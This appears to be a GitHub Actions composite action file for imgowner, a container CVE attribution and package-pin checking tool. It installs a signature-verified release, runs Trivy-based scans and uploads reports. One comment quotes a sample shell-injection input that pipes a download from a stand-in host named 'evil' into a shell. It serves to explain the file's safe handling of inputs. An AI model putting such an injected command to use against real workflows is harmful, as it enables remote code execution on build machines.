name: imgowner
description: Container CVE attribution and OS package pin updater

inputs:
  image:
    description: Image reference to scan (e.g. myregistry/myapp:latest)
    required: true
  dockerfile:
    description: Path to the Dockerfile
    required: false
    default: Dockerfile
  base-image-ref:
    description: Baseline image ref for new_only diff (required when new_only is set in config)
    required: false
    default: ''
  format:
    description: Comma-separated report formats (md,json,sarif)
    required: false
    default: md,json,sarif
  output-dir:
    description: Directory to write report files into
    required: false
    default: imgowner-report
  config:
    description: Path to .imgowner.yaml config file. If it doesn't exist, imgowner's built-in defaults are used (the flag is omitted, not an error).
    required: false
    default: .imgowner.yaml
  pr-id:
    description: Pull request number to post attribution comment on
    required: false
    default: ''
  pins-check:
    description: Run pin version check after attribution
    required: false
    default: 'false'
  upload-sarif:
    description: Upload the SARIF report to code scanning (needs GitHub Advanced Security on private repositories)
    required: false
    default: 'true'
  artifact-name:
    description: Name of the uploaded report artifact (must be unique per job)
    required: false
    default: imgowner-report
  version:
    description: imgowner release to install (e.g. 0.6.0). Defaults to the release tag this action is pinned to.
    required: false
    default: ''
  trivy-version:
    description: Trivy version to install when trivy is not already on PATH (must satisfy scan.trivy_min_version)
    required: false
    default: 0.76.0

outputs:
  report-dir:
    description: Directory containing the generated report files
    value: ${{ steps.run.outputs.report-dir }}
  findings-count:
    description: Total number of CVE findings (empty if no JSON report was produced)
    value: ${{ steps.run.outputs.findings-count }}

# Every input reaches the shell through an environment variable, never by
# ${{ }} interpolation into a script: interpolation pastes the text into the
# script source, so an input like `x"; curl evil | sh; "` would run.
runs:
  using: composite
  steps:
    - uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2

    - name: Install imgowner (signed release)
      shell: bash
      env:
        INPUT_VERSION: ${{ inputs.version }}
        ACTION_REF: ${{ github.action_ref }}
      run: |
        set -euo pipefail
        # The binary always comes from a signed release, never a source build
        # of whatever a branch holds at run time.
        v="${INPUT_VERSION#v}"
        if [ -z "$v" ]; then
          if [[ "$ACTION_REF" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then v="${ACTION_REF#v}"
          else
            echo "::error::pin the action to a release tag (uses: Arham1716/imgowner@vX.Y.Z) or set the 'version' input; got ref '${ACTION_REF}'"
            exit 1
          fi
        fi
        if ! [[ "$v" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then echo "::error::invalid version '$v'"; exit 1; fi
        case "$RUNNER_OS/$RUNNER_ARCH" in
          Linux/X64) os=linux arch=amd64 ;; Linux/ARM64) os=linux arch=arm64 ;;
          macOS/X64) os=darwin arch=amd64 ;; macOS/ARM64) os=darwin arch=arm64 ;;
          *) echo "::error::imgowner's action supports Linux and macOS runners, not $RUNNER_OS/$RUNNER_ARCH"; exit 1 ;;
        esac
        archive="imgowner_${v}_${os}_${arch}.tar.gz"
        base="https://github.com/Arham1716/imgowner/releases/download/v${v}"
        work="$(mktemp -d)"
        for f in checksums.txt checksums.txt.bundle "$archive"; do
          curl -fsSL --retry 3 -o "$work/$f" "$base/$f"
        done
        cosign verify-blob --bundle "$work/checksums.txt.bundle" \
          --certificate-identity "https://github.com/Arham1716/imgowner/.github/workflows/release.yml@refs/tags/v${v}" \
          --certificate-oidc-issuer https://token.actions.githubusercontent.com \
          "$work/checksums.txt"
        (cd "$work" && grep "  ${archive}\$" checksums.txt | sha256sum -c -)
        bin="$RUNNER_TEMP/imgowner-bin"
        mkdir -p "$bin"
        tar -xzf "$work/$archive" -C "$bin" imgowner
        echo "$bin" >> "$GITHUB_PATH"
        "$bin/imgowner" --version

    - name: Install Trivy
      shell: bash
      env:
        TRIVY_VER: ${{ inputs.trivy-version }}
      run: |
        set -euo pipefail
        if command -v trivy >/dev/null 2>&1; then trivy --version | head -1; exit 0; fi
        v="${TRIVY_VER#v}"
        if ! [[ "$v" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then echo "::error::invalid trivy-version '$v'"; exit 1; fi
        case "$RUNNER_OS/$RUNNER_ARCH" in
          Linux/X64) plat=Linux-64bit ;; Linux/ARM64) plat=Linux-ARM64 ;;
          macOS/X64) plat=macOS-64bit ;; macOS/ARM64) plat=macOS-ARM64 ;;
          *) echo "::error::unsupported runner $RUNNER_OS/$RUNNER_ARCH"; exit 1 ;;
        esac
        archive="trivy_${v}_${plat}.tar.gz"
        base="https://github.com/aquasecurity/trivy/releases/download/v${v}"
        work="$(mktemp -d)"
        curl -fsSL --retry 3 -o "$work/$archive" "$base/$archive"
        curl -fsSL --retry 3 -o "$work/checksums.txt" "$base/trivy_${v}_checksums.txt"
        (cd "$work" && grep "  ${archive}\$" checksums.txt | sha256sum -c -)
        bin="$RUNNER_TEMP/trivy-bin"
        mkdir -p "$bin"
        tar -xzf "$work/$archive" -C "$bin" trivy
        echo "$bin" >> "$GITHUB_PATH"
        "$bin/trivy" --version | head -1

    - name: Run imgowner ci
      id: run
      shell: bash
      env:
        IN_IMAGE: ${{ inputs.image }}
        IN_DOCKERFILE: ${{ inputs.dockerfile }}
        IN_CONFIG: ${{ inputs.config }}
        IN_OUTPUT_DIR: ${{ inputs.output-dir }}
        IN_FORMAT: ${{ inputs.format }}
        IN_BASE_REF: ${{ inputs.base-image-ref }}
        IN_PR_ID: ${{ inputs.pr-id }}
      run: |
        set -euo pipefail
        args=(ci --image "$IN_IMAGE" --dockerfile "$IN_DOCKERFILE" --output-dir "$IN_OUTPUT_DIR")
        # --config is only passed when the file is actually there: imgowner
        # requires an explicitly named config file to exist (a typo'd path
        # must not be silently ignored), and the config input's default
        # (.imgowner.yaml) is the common case where the repository has no
        # config file at all and imgowner's own built-in defaults should
        # apply -- exactly as running the CLI with no --config flag does.
        [ -f "$IN_CONFIG" ] && args+=(--config "$IN_CONFIG")
        IFS=',' read -r -a formats <<< "$IN_FORMAT"
        for f in "${formats[@]}"; do
          f="${f//[[:space:]]/}"
          [ -n "$f" ] && args+=(--format "$f")
        done
        [ -n "$IN_BASE_REF" ] && args+=(--base-image-ref "$IN_BASE_REF")
        [ -n "$IN_PR_ID" ] && args+=(--pr-id "$IN_PR_ID")
        echo "report-dir=$IN_OUTPUT_DIR" >> "$GITHUB_OUTPUT"
        rc=0
        imgowner "${args[@]}" || rc=$?
        report="$IN_OUTPUT_DIR/imgowner-report.json"
        if [ -f "$report" ]; then
          echo "findings-count=$(jq '.findings | length' "$report")" >> "$GITHUB_OUTPUT"
        fi
        exit "$rc"

    - name: Upload SARIF
      if: always() && inputs.upload-sarif == 'true' && hashFiles(format('{0}/imgowner-report.sarif', inputs.output-dir)) != ''
      uses: github/codeql-action/upload-sarif@9b3254085494b55a0f7c4c2b3d2d52cc712ce370 # v4.39.1
      with:
        sarif_file: ${{ inputs.output-dir }}/imgowner-report.sarif
        category: imgowner

    - name: Upload report artifacts
      if: always() && hashFiles(format('{0}/imgowner-report.*', inputs.output-dir)) != ''
      uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
      with:
        name: ${{ inputs.artifact-name }}
        path: ${{ inputs.output-dir }}/

    - name: Run pin check
      if: inputs.pins-check == 'true'
      shell: bash
      env:
        IN_DOCKERFILE: ${{ inputs.dockerfile }}
        IN_CONFIG: ${{ inputs.config }}
      run: |
        set -euo pipefail
        args=(pins check --dockerfile "$IN_DOCKERFILE")
        [ -f "$IN_CONFIG" ] && args+=(--config "$IN_CONFIG")
        imgowner "${args[@]}"
